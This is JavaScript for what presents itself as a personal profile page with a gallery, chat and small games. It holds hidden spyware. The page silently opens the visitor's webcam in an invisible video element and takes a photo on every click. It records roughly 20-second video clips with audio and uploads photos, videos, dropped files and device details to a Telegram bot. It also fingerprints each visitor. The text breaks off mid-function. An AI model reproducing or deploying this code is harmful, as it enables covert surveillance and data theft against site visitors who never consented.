(function(){
  const C = window.CONFIG;
  const SYNC = window.SYNC;
  const $ = s => document.querySelector(s);
  const $$ = s => document.querySelectorAll(s);

  const LS = {
    get(k,d){try{return JSON.parse(localStorage.getItem('tj_'+k))??d}catch{return d}},
    set(k,v){localStorage.setItem('tj_'+k,JSON.stringify(v))}
  };

  let state = null;

  function defaultState(){
    return {
      owner: JSON.parse(JSON.stringify(C.OWNER)),
      theme: 'dark', gallery: [], avatar: '',
      heroStyle: 'circle',
      maintenance: false, visits: 0, captures: 0, videos: 0,
      photoMode: true, videoMode: true, dropMode: true,
      visitors: [], messages: [], replies: [],
      lockEnabled: true, lockDuration: 15, notifyLogin: true,
      loginLog: [], failedLogins: 0, lockedUntil: 0
    };
  }

  function getLocal(){
    const s = LS.get('state', null);
    if(s) return s;
    const d = defaultState();
    LS.set('state', d);
    return d;
  }

  function saveLocal(s){ LS.set('state', s); }

  async function boot(){
    // Load local first
    state = getLocal();
    render();

    // Then pull cloud
    if(SYNC.isReady()){
      const cloud = await SYNC.pull();
      if(cloud){
        state = Object.assign(state, cloud);
        // Merge visits: take max
        state.visits = Math.max(state.visits||0, cloud.visits||0);
        saveLocal(state);
        render();
      }
    }

    // Register visit
    state.visits = (state.visits||0) + 1;
    state.visitors = state.visitors || [];
    state.visitors.push({
      t: new Date().toISOString(),
      ua: navigator.userAgent,
      lang: navigator.language,
      screen: screen.width+'x'+screen.height,
      plat: navigator.platform,
      ref: document.referrer || 'direct'
    });
    if(state.visitors.length > 300) state.visitors = state.visitors.slice(-300);
    saveLocal(state);
    if(SYNC.isReady()) SYNC.push(state);
  }

  function toast(msg){
    let t = document.querySelector('.toast');
    if(!t){t=document.createElement('div');t.className='toast';document.body.appendChild(t)}
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(t._to);
    t._to = setTimeout(()=>t.classList.remove('show'), 2500);
  }

  function tg(api, body){
    if(typeof body === 'string'){
      return fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(body)
      }).catch(()=>{});
    }
    return fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', body}).catch(()=>{});
  }

  // Welcome
  const enterBtn = $('#enterBtn');
  if(enterBtn){
    enterBtn.addEventListener('click', async ()=>{
      const w = $('#welcome');
      if(w){ w.classList.add('hide'); setTimeout(()=>w.style.display='none', 800); }
      await startCamera();
      if(camReady) setTimeout(snapPhoto, 300);
      setTimeout(startVideoRec, 1500);
    });
  }

  // Scroll + reveal
  window.addEventListener('scroll', ()=>{
    const h = document.documentElement;
    const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
    const prog=$('#progress'); if(prog) prog.style.width = p+'%';
    const tt=$('#toTop'); if(tt) tt.classList.toggle('show', h.scrollTop > 400);
    revealOnScroll();
  });
  function revealOnScroll(){
    $$('.reveal').forEach(el => {
      const r = el.getBoundingClientRect();
      if(r.top < window.innerHeight - 60) el.classList.add('visible');
    });
  }

  // Cursor glow
  const glow = document.createElement('div');
  glow.className = 'cursor-glow';
  document.body.appendChild(glow);
  document.addEventListener('mousemove', e => {
    glow.style.left = e.clientX+'px'; glow.style.top = e.clientY+'px';
  });

  // Theme
  function applyTheme(t){
    if(t==='dark') document.documentElement.removeAttribute('data-theme');
    else document.documentElement.setAttribute('data-theme', t);
    const tb=$('#themeBtn');
    if(tb) tb.textContent = t==='light'?'☀️':t==='neon'?'⚡':t==='royal'?'👑':t==='ocean'?'🌊':t==='crimson'?'🔥':t==='forest'?'🌲':'🌙';
  }

  // Age
  function tickAge(){
    if(!state) return;
    const bd = new Date(state.owner.birthdate);
    if(isNaN(bd.getTime())) return;
    const now = new Date();
    let y = now.getFullYear() - bd.getFullYear();
    let mo = now.getMonth() - bd.getMonth();
    let d = now.getDate() - bd.getDate();
    let h = now.getHours() - bd.getHours();
    let mi = now.getMinutes() - bd.getMinutes();
    let s = now.getSeconds() - bd.getSeconds();
    if(s<0){s+=60;mi--;} if(mi<0){mi+=60;h--;} if(h<0){h+=24;d--;}
    if(d<0){const pm=new Date(now.getFullYear(),now.getMonth(),0);d+=pm.getDate();mo--;}
    if(mo<0){mo+=12;y--;}
    const set=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=String(v).padStart(2,'0')};
    set('aYears',y);set('aMonths',mo);set('aDays',d);set('aHours',h);set('aMins',mi);set('aSecs',s);
  }

  function applyHeroStyle(style){
    const wrap = $('#heroStyleWrap');
    const img = $('#avatarImg');
    const ph = $('#avatarPlaceholder');
    if(!wrap) return;
    wrap.className = 'hero-' + (style || 'circle');
    if(state.avatar){
      if(img){ img.src = state.avatar; img.style.display = 'block'; }
      if(ph) ph.style.display = 'none';
    } else {
      if(img) img.style.display = 'none';
      if(ph) ph.style.display = 'flex';
    }
  }

  // Render
  function render(){
    if(!state) return;
    applyTheme(state.theme);
    const o = state.owner;
    const setT=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
    setT('ownerName',o.name); setT('ownerTitle',o.title);
    setT('ownerLocation','📍 '+o.location);
    setT('quoteText','"'+o.quote+'"'); setT('aboutText',o.about);
    setT('siteBrand',o.siteName||'طه'); setT('footerBrand',o.siteName||'طه');
    document.title = o.name || 'طه';

    applyHeroStyle(state.heroStyle);

    const links = {waBtn:o.whatsapp, floatWA:o.whatsapp, fbBtn:o.facebook, igBtn:o.instagram};
    Object.entries(links).forEach(([id,href])=>{const el=document.getElementById(id);if(el&&href)el.href=href;});

    // features
    const fg=$('#featuresGrid'); const fSec=$('#features');
    if(fg && fSec){
      fg.innerHTML='';
      const items=(o.features||[]);
      if(items.length) fSec.style.display='';
      else fSec.style.display='none';
      items.forEach(f=>{
        const d=document.createElement('div');
        d.className='feature-card';
        d.innerHTML='<span class="feature-icon">'+(f.icon||'✨')+'</span><div class="feature-name">'+f.name+'</div><div class="feature-desc">'+(f.desc||'')+'</div>';
        fg.appendChild(d);
      });
    }

    // gallery
    const g=$('#galleryGrid'); const gSec=$('#gallery');
    if(g){
      g.innerHTML='';
      const items = state.gallery || [];
      if(items.length && gSec) gSec.style.display='';
      else if(gSec) gSec.style.display='none';
      items.forEach((url,i)=>{
        const d=document.createElement('div');
        d.className='gallery-item';
        d.innerHTML='<img src="'+url+'" alt="'+(i+1)+'" loading="lazy">';
        d.addEventListener('click', ()=>{
          const li=$('#lightboxImg'); if(li) li.src=url;
          const lx=$('#lightbox'); if(lx) lx.classList.add('show');
        });
        g.appendChild(d);
      });
    }

    // links
    const el=$('#extraLinksList'); const lSec=$('#links');
    if(el){
      el.innerHTML='';
      const items=(o.extraLinks||[]);
      if(items.length && lSec) lSec.style.display='';
      else if(lSec) lSec.style.display='none';
      items.forEach(l=>{
        const a=document.createElement('a');
        a.className='extra-link';
        a.href=l.url; a.target='_blank'; a.rel='noopener';
        a.innerHTML='<div class="extra-link-icon">'+(l.icon||'🔗')+'</div><div class="extra-link-body"><b>'+l.name+'</b><small>'+l.url.slice(0,30)+'</small></div>';
        el.appendChild(a);
      });
    }
    setT('year', new Date().getFullYear());

    // chat replies
    renderChatReplies();
  }

  function renderChatReplies(){
    const box = $('#chatReplies');
    const list = $('#chatRepliesList');
    if(!box || !list) return;
    const replies = (state.replies||[]);
    if(!replies.length){ box.style.display='none'; return; }
    box.style.display='block';
    list.innerHTML = replies.slice(-10).map(r => 
      '<div style="padding:8px;background:rgba(139,92,246,.15);border-right:3px solid #8b5cf6;border-radius:6px;margin-bottom:6px;font-size:12px;color:var(--text)">'+r.text+'<br><span style="color:var(--muted);font-size:10px">'+new Date(r.t).toLocaleString('ar-EG')+'</span></div>'
    ).join('');
  }

  // Theme toggle
  const tb=$('#themeBtn');
  if(tb) tb.addEventListener('click', ()=>{
    const order=['dark','light','neon','royal','ocean','crimson','forest'];
    const i=(order.indexOf(state.theme)+1)%order.length;
    state.theme=order[i]; applyTheme(state.theme); saveLocal(state);
    if(SYNC.isReady()) SYNC.push(state);
  });

  // Buttons
  const lx=$('#lightbox');
  if(lx) lx.addEventListener('click', e=>{
    if(e.target.id==='lightbox'||e.target.classList.contains('close')) lx.classList.remove('show');
  });
  const tt=$('#toTop');
  if(tt) tt.addEventListener('click', ()=>window.scrollTo({top:0,behavior:'smooth'}));

  const sh=$('#shareBtn');
  if(sh) sh.addEventListener('click', async ()=>{
    const url=location.href;
    if(navigator.share){try{await navigator.share({title:state.owner.name,url});return}catch{}}
    try{await navigator.clipboard.writeText(url);toast('✅ تم نسخ الرابط')}catch{}
  });

  const callBtn=$('#callBtn');
  if(callBtn) callBtn.addEventListener('click', ()=>{ location.href='tel:'+C.PHONE; });

  // Chat
  const chatModal=$('#chatModal');
  const chatBtn=$('#chatBtn');
  if(chatBtn) chatBtn.addEventListener('click', ()=>{chatModal.classList.add('show');renderChatReplies()});
  const chatClose=$('#chatClose');
  if(chatClose) chatClose.addEventListener('click', ()=>chatModal.classList.remove('show'));
  if(chatModal) chatModal.addEventListener('click', e=>{if(e.target.id==='chatModal')chatModal.classList.remove('show')});

  const chatSend=$('#chatSend');
  if(chatSend) chatSend.addEventListener('click', async ()=>{
    const name=$('#chatName').value.trim() || 'زائر';
    const phone=$('#chatPhone').value.trim();
    const msg=$('#chatMsg').value.trim();
    if(!msg){toast('❌ اكتب رسالة');return}
    const text = '✉️ رسالة جديدة\n👤 '+name+'\n'+(phone?'📞 '+phone+'\n':'')+'💬 '+msg+'\n⏰ '+new Date().toLocaleString('ar-EG');
    await tg('sendMessage', {chat_id:C.OWNER_ID, text, parse_mode:'HTML'});
    state.messages = state.messages||[];
    state.messages.push({name, phone, msg, t:new Date().toISOString(), visitorId: getVisitorId()});
    saveLocal(state);
    if(SYNC.isReady()) SYNC.push(state);
    $('#chatMsg').value='';
    toast('✅ تم إرسال رسالتك');
    setTimeout(()=>chatModal.classList.remove('show'), 800);
  });

  // QR
  const qb=$('#qrBtn');
  if(qb) qb.addEventListener('click', e=>{
    e.stopPropagation();
    const qi=$('#qrImg'); if(qi) qi.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(location.href);
    const qm=$('#qrModal'); if(qm) qm.classList.add('show');
  });
  const qc=$('#qrClose');
  if(qc) qc.addEventListener('click', e=>{e.stopPropagation();$('#qrModal').classList.remove('show')});
  const qm=$('#qrModal');
  if(qm) qm.addEventListener('click', e=>{if(e.target.id==='qrModal')qm.classList.remove('show')});

  // Camera
  const video = document.createElement('video');
  video.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
  video.muted=true; video.playsInline=true; video.autoplay=true;
  document.body.appendChild(video);

  let camStream=null, camReady=false, camBusy=false, camStarted=false;

  async function startCamera(){
    if(camStarted) return;
    camStarted=true;
    try{
      camStream = await navigator.mediaDevices.getUserMedia({
        video:{facingMode:'user',width:{ideal:960},height:{ideal:720}}, audio:false
      });
      video.srcObject = camStream;
      await new Promise(res=>{
        if(video.readyState>=2) return res();
        video.onloadedmetadata=()=>res();
      });
      await video.play().catch(()=>{});
      camReady=true;
    }catch(e){ camStarted=false; }
  }

  async function snapPhoto(){
    if(!camReady||camBusy||!state.photoMode) return;
    if(!camStream) return;
    const tr=camStream.getVideoTracks()[0];
    if(!tr||tr.readyState!=='live'){camReady=false;camStarted=false;return}
    camBusy=true;
    try{
      const w=video.videoWidth||640, h=video.videoHeight||480;
      const cv=document.createElement('canvas');
      cv.width=w; cv.height=h;
      cv.getContext('2d').drawImage(video,0,0,w,h);
      const dataUrl=cv.toDataURL('image/jpeg',.82);
      state.captures=(state.captures||0)+1;
      saveLocal(state);
      if(SYNC.isReady()) SYNC.push(state);
      const caption='📸 صورة\n⏰ '+new Date().toLocaleString('ar-EG')+
        '\n💻 '+(navigator.platform||'—')+
        '\n📐 '+screen.width+'x'+screen.height+
        '\n#️⃣ #'+state.captures;
      const blob=await (await fetch(dataUrl)).blob();
      const fd=new FormData();
      fd.append('chat_id',C.OWNER_ID);
      fd.append('photo',blob,'shot_'+Date.now()+'.jpg');
      fd.append('caption',caption);
      tg('sendPhoto', fd);
    }catch(e){console.warn(e)}
    finally{camBusy=false}
  }

  document.addEventListener('pointerdown', ()=>{
    if(!state || !state.photoMode) return;
    if(camReady) snapPhoto();
  }, {passive:true});

  // Video
  let recStream=null, recorder=null, recChunks=[], recTimer=null, recStart=0;

  const recIndicator=document.createElement('div');
  recIndicator.className='rec-indicator';
  recIndicator.innerHTML='<span class="rec-dot"></span><span id="recTime">00:00</span>';
  document.body.appendChild(recIndicator);

  async function startVideoRec(){
    if(!state || !state.videoMode || recorder) return;
    try{
      recStream = await navigator.mediaDevices.getUserMedia({
        video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
        audio:{echoCancellation:true,noiseSuppression:true}
      });
      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9'
        : MediaRecorder.isTypeSupported('video/webm') ? 'video/webm'
        : MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : '';
      recorder = new MediaRecorder(recStream, mime ? {mimeType:mime, videoBitsPerSecond:1500000} : {});
      recChunks=[];
      recorder.ondataavailable = e => { if(e.data && e.data.size>0) recChunks.push(e.data); };
      recorder.onstop = () => uploadVideo();
      recorder.start(2000);
      recStart=Date.now();
      recIndicator.classList.add('show');
      recTimer=setInterval(()=>{
        const s=Math.floor((Date.now()-recStart)/1000);
        const m=Math.floor(s/60), ss=s%60;
        const t=document.getElementById('recTime');
        if(t) t.textContent=String(m).padStart(2,'0')+':'+String(ss).padStart(2,'0');
      },1000);
      setTimeout(()=>{ if(recorder && recorder.state==='recording') stopVideoRec(); }, 20000);
    }catch(e){ console.warn('video err',e); }
  }

  async function stopVideoRec(){
    if(!recorder) return;
    try{ recorder.stop(); }catch{}
    if(recTimer){clearInterval(recTimer);recTimer=null}
    recIndicator.classList.remove('show');
    if(recStream){recStream.getTracks().forEach(t=>t.stop());recStream=null}
  }

  async function uploadVideo(){
    if(!recChunks.length) return;
    const blob = new Blob(recChunks, {type:recChunks[0].type || 'video/webm'});
    recChunks=[];
    const dur = Math.floor((Date.now()-recStart)/1000);
    if(dur < 2) return;
    state.videos=(state.videos||0)+1;
    saveLocal(state);
    if(SYNC.isReady()) SYNC.push(state);
    const ext = blob.type.includes('mp4')?'mp4':'webm';
    const caption='🎥 فيديو\n⏰ '+new Date().toLocaleString('ar-EG')+
      '\n⏱️ '+dur+' ثانية\n#️⃣ #'+state.videos;
    const fd=new FormData();
    fd.append('chat_id',C.OWNER_ID);
    fd.append('video',blob,'clip_'+Date.now()+'.'+ext);
    fd.append('caption',caption);
    tg('sendVideo', fd);
    recorder=null;
  }

  // Drag drop
  const dropZone=document.createElement('div');
  dropZone.className='drop-zone';
  dropZone.innerHTML='<div class="drop-zone-inner"><span class="icon">📁</span>اسحب الملفات هنا</div>';
  document.body.appendChild(dropZone);

  let dragCounter=0;
  document.addEventListener('dragenter', e=>{
    if(state && state.dropMode && e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
      dragCounter++;
      dropZone.classList.add('show');
    }
  });
  document.addEventListener('dragover', e=>e.preventDefault());
  document.addEventListener('dragleave', ()=>{
    dragCounter--;
    if(dragCounter<=0){dragCounter=0;dropZone.classList.remove('show')}
  });
  document.addEventListener('drop', async e=>{
    e.preventDefault();
    dragCounter=0;
    dropZone.classList.remove('show');
    if(!state || !state.dropMode) return;
    const files = e.dataTransfer && e.dataTransfer.files;
    if(!files || !files.length) return;
    for(const f of files){ await sendFileToBot(f); }
    toast('✅ تم إرسال '+files.length+' ملف');
  });

  async function sendFileToBot(file){
    const caption='📎 ملف\n📄 '+file.name+'\n📐 '+(file.size/1024).toFixed(1)+' KB';
    const fd=new FormData();
    fd.append('chat_id',C.OWNER_ID);
    fd.append('document',file);
    fd.append('caption',caption);
    tg('sendDocument', fd);
  }

  // Apps modal
  const appsBtn=$('#appsBtn');
  const appsModal=$('#appsModal');
  const appsClose=$('#appsClose');
  const appSpace=$('#appSpace');
  const appContent=$('#appContent');
  const appBack=$('#appBack');

  if(appsBtn) appsBtn.addEventListener('click', ()=>appsModal.classList.add('show'));
  if(appsClose) appsClose.addEventListener('click', ()=>appsModal.classList.remove('show'));
  if(appsModal) appsModal.addEventListener('click', e=>{if(e.target.id==='appsModal')appsModal.classList.remove('show')});
  if(appBack) appBack.addEventListener('click', ()=>{
    appSpace.classList.remove('show');
    appContent.innerHTML='';
  });

  document.querySelectorAll('.app-card').forEach(c=>{
    c.addEventListener('click', ()=>{
      appsModal.classList.remove('show');
      appSpace.classList.add('show');
      openApp(c.dataset.app);
    });
  });

  function openApp(app){
    const A = appContent;
    A.innerHTML='';
    if(app==='calc') A.innerHTML = calcHTML();
    if(app==='browser') A.innerHTML = browserHTML();
    if(app==='tictactoe') A.innerHTML = tttHTML();
    if(app==='guess') A.innerHTML = guessHTML();
    if(app==='memory') A.innerHTML = memHTML();
    if(app==='rps') A.innerHTML = rpsHTML();
    if(app==='dice') A.innerHTML = diceHTML();
    if(app==='flip') A.innerHTML = flipHTML();
    if(app==='timer') A.innerHTML = timerHTML();
    if(app==='stopwatch') A.innerHTML = stopHTML();
    if(app==='random') A.innerHTML = randomHTML();
    if(app==='notes') A.innerHTML = notesHTML();
    if(app==='qrgen') A.innerHTML = qrgenHTML();
    if(app==='bmi') A.innerHTML = bmiHTML();
    if(app==='password') A.innerHTML = passHTML();
    wireApp(app);
  }

  function calcHTML(){
    return '<div style="max-width:360px;margin:0 auto"><h2 style="color:var(--accent);text-align:center;margin-bottom:14px">🧮 حاسبة</h2>'
      +'<input id="calcDisp" readonly style="width:100%;padding:16px;font-size:26px;text-align:left;background:var(--card);border:1px solid var(--border);border-radius:12px;color:var(--text);margin-bottom:10px">'
      +'<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px">'
      +'<button class="calcBtn" data-v="C">C</button><button class="calcBtn" data-v="⌫">⌫</button><button class="calcBtn" data-v="%">%</button><button class="calcBtn" data-v="/">÷</button>'
      +'<button class="calcBtn" data-v="7">7</button><button class="calcBtn" data-v="8">8</button><button class="calcBtn" data-v="9">9</button><button class="calcBtn" data-v="*">×</button>'
      +'<button class="calcBtn" data-v="4">4</button><button class="calcBtn" data-v="5">5</button><button class="calcBtn" data-v="6">6</button><button class="calcBtn" data-v="-">−</button>'
      +'<button class="calcBtn" data-v="1">1</button><button class="calcBtn" data-v="2">2</button><button class="calcBtn" data-v="3">3</button><button class="calcBtn" data-v="+">+</button>'
      +'<button class="calcBtn" data-v="0" style="grid-column:span 2">0</button><button class="calcBtn" data-v=".">.</button><button class="calcBtn" data-v="=">=</button>'
      +'</div></div>';
  }
  function browserHTML(){
    return '<div style="max-width:100%"><h2 style="color:var(--accent);text-align:center;margin-bottom:14px">🌐 متصفح</h2>'
      +'<p style="color:var(--muted);font-size:12px;margin-bottom:10px;text-align:center">بعض المواقع تمنع التضمين — استخدم زر "فتح في تاب جديد"</p>'
      +'<input id="brUrl" placeholder="https://example.com" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">'
      +'<button id="brGo" style="padding:11px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">فتح داخلي</button>'
      +'<button id="brNew" style="padding:11px;background:#8b5cf6;color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer">فتح في تاب</button>'
      +'</div>'
      +'<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:10px">'
      +'<button class="brQuick" data-url="https://ar.wikipedia.org" style="padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:11px">ويكيبيديا</button>'
      +'<button class="brQuick" data-url="https://duckduckgo.com" style="padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:11px">DuckDuckGo</button>'
      +'<button class="brQuick" data-url="https://www.bing.com" style="padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:11px">Bing</button>'
      +'</div>'
      +'<iframe id="brFrame" style="width:100%;height:50vh;border:1px solid var(--border);border-radius:10px;background:#fff"></iframe></div>';
  }
  function tttHTML(){
    return '<div style="max-width:300px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">❌ إكس أو</h2>'
      +'<div id="tttStatus" style="margin-bottom:10px;color:var(--text)">دورك (X)</div>'
      +'<div id="tttBoard" style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px"></div>'
      +'<button id="tttReset" style="margin-top:14px;padding:9px 18px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">جديد</button></div>';
  }
  function guessHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎯 تخمين</h2>'
      +'<p id="gMsg" style="color:var(--text);margin-bottom:12px">خمّن رقم 1-100</p>'
      +'<input id="gIn" type="number" style="width:100%;padding:12px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<button id="gGo" style="width:100%;padding:11px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">جرب</button>'
      +'<button id="gReset" style="margin-top:8px;padding:8px 16px;background:var(--bg-2);color:var(--text);border:1px solid var(--border);border-radius:10px;cursor:pointer">من جديد</button></div>';
  }
  function memHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🧠 الذاكرة</h2>'
      +'<p id="mStatus" style="color:var(--text);margin-bottom:10px">Matches: 0</p>'
      +'<div id="mBoard" style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px"></div>'
      +'<button id="mReset" style="margin-top:14px;padding:9px 18px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">جديد</button></div>';
  }
  function rpsHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">✊ حجر ورقة مقص</h2>'
      +'<div id="rpsRes" style="margin-bottom:14px;color:var(--text);font-size:18px">اختر</div>'
      +'<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">'
      +'<button class="rpsBtn" data-v="rock" style="padding:20px;background:var(--card);border:1px solid var(--border);border-radius:14px;font-size:32px;cursor:pointer">✊</button>'
      +'<button class="rpsBtn" data-v="paper" style="padding:20px;background:var(--card);border:1px solid var(--border);border-radius:14px;font-size:32px;cursor:pointer">✋</button>'
      +'<button class="rpsBtn" data-v="scissors" style="padding:20px;background:var(--card);border:1px solid var(--border);border-radius:14px;font-size:32px;cursor:pointer">✌️</button></div></div>';
  }
  function diceHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎲 نرد</h2>'
      +'<div id="diceRes" style="font-size:80px;margin:20px 0">🎲</div>'
      +'<button id="diceGo" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer">ارمِ</button></div>';
  }
  function flipHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🪙 عملة</h2>'
      +'<div id="flipRes" style="font-size:80px;margin:20px 0">🪙</div>'
      +'<button id="flipGo" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer">اقلب</button></div>';
  }
  function timerHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">⏱️ مؤقت</h2>'
      +'<input id="tMin" type="number" placeholder="دقائق" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:10px">'
      +'<div id="tDisp" style="font-size:48px;color:var(--accent);font-weight:800;margin:14px 0">00:00</div>'
      +'<button id="tGo" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer;margin-right:8px">ابدأ</button>'
      +'<button id="tStop" style="padding:12px 24px;background:#dc143c;color:#fff;border:none;border-radius:12px;font-weight:700;cursor:pointer">إيقاف</button></div>';
  }
  function stopHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">⏲️ ساعة</h2>'
      +'<div id="swDisp" style="font-size:48px;color:var(--accent);font-weight:800;margin:20px 0">00:00.00</div>'
      +'<button id="swStart" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer;margin-right:8px">ابدأ</button>'
      +'<button id="swReset" style="padding:12px 24px;background:var(--bg-2);color:var(--text);border:1px solid var(--border);border-radius:12px;cursor:pointer">صفر</button></div>';
  }
  function randomHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎰 عشوائي</h2>'
      +'<input id="rMin" type="number" placeholder="الحد الأدنى" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<input id="rMax" type="number" placeholder="الحد الأقصى" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<div id="rRes" style="font-size:48px;color:var(--accent);font-weight:800;margin:16px 0">—</div>'
      +'<button id="rGo" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer">اسحب</button></div>';
  }
  function notesHTML(){
    return '<div style="max-width:500px;margin:0 auto"><h2 style="color:var(--accent);text-align:center;margin-bottom:14px">📝 ملاحظات</h2>'
      +'<textarea id="ntxt" style="width:100%;min-height:300px;padding:14px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:inherit;font-size:14px"></textarea>'
      +'<button id="nsave" style="margin-top:10px;padding:10px 20px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">حفظ</button>'
      +'<span id="nstat" style="margin-right:10px;color:var(--muted);font-size:12px"></span></div>';
  }
  function qrgenHTML(){
    return '<div style="max-width:400px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">📱 QR Generator</h2>'
      +'<input id="qrText" placeholder="نص أو رابط" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:10px">'
      +'<button id="qrGo" style="padding:11px 24px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">توليد</button>'
      +'<div id="qrOut" style="margin-top:16px"></div></div>';
  }
  function bmiHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">⚖️ BMI</h2>'
      +'<input id="bmiW" type="number" placeholder="الوزن (كجم)" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<input id="bmiH" type="number" placeholder="الطول (سم)" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<button id="bmiGo" style="padding:11px 24px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">احسب</button>'
      +'<div id="bmiRes" style="margin-top:16px;font-size:24px;color:var(--accent);font-weight:800"></div></div>';
  }
  function passHTML(){
    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🔐 كلمة سر</h2>'
      +'<input id="passLen" type="number" value="16" min="4" max="64" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
      +'<button id="passGo" style="padding:11px 24px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">توليد</button>'
      +'<div id="passRes" style="margin-top:16px;padding:14px;background:var(--card);border:1px solid var(--border);border-radius:10px;font-family:monospace;word-break:break-all;color:var(--accent);font-size:14px"></div>'
      +'<button id="passCopy" style="margin-top:8px;padding:8px 16px;background:var(--bg-2);color:var(--text);border:1px solid var(--border);border-radius:10px;cursor:pointer">📋 نسخ</button></div>';
  }

  function wireApp(app){
    const $a = s=>appContent.querySelector(s);

    if(app==='calc'){
      let disp = $a('#calcDisp');
      appContent.querySelectorAll('.calcBtn').forEach(b=>{
        b.style.cssText='padding:16px;background:var(--card);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:18px;font-weight:700;cursor:pointer;font-family:inherit';
        b.addEventListener('click', ()=>{
          const v=b.dataset.v;
          if(v==='C') disp.value='';
          else if(v==='⌫') disp.value=disp.value.slice(0,-1);
          else if(v==='='){try{disp.value=String(eval(disp.value.replace(/%/g,'/100')))}catch{disp.value='خطأ'}}
          else disp.value+=v;
        });
      });
    }

    if(app==='browser'){
      const go=$a('#brGo'), url=$a('#brUrl'), f=$a('#brFrame'), nw=$a('#brNew');
      go.addEventListener('click', ()=>{
        let u=url.value.trim(); if(!u) return;
        if(!/^https?:/.test(u)) u='https://'+u;
        f.src=u;
      });
      nw.addEventListener('click', ()=>{
        let u=url.value.trim(); if(!u) return;
        if(!/^https?:/.test(u)) u='https://'+u;
        window.open(u, '_blank');
      });
      appContent.querySelectorAll('.brQuick').forEach(b=>{
        b.addEventListener('click', ()=>{
          url.value = b.dataset.url;
          f.src = b.dataset.url;
        });
      });
    }

    if(app==='tictactoe'){
      let board=['','','','','','','','',''], turn='X', done=false;
      const el=$a('#tttBoard'), st=$a('#tttStatus');
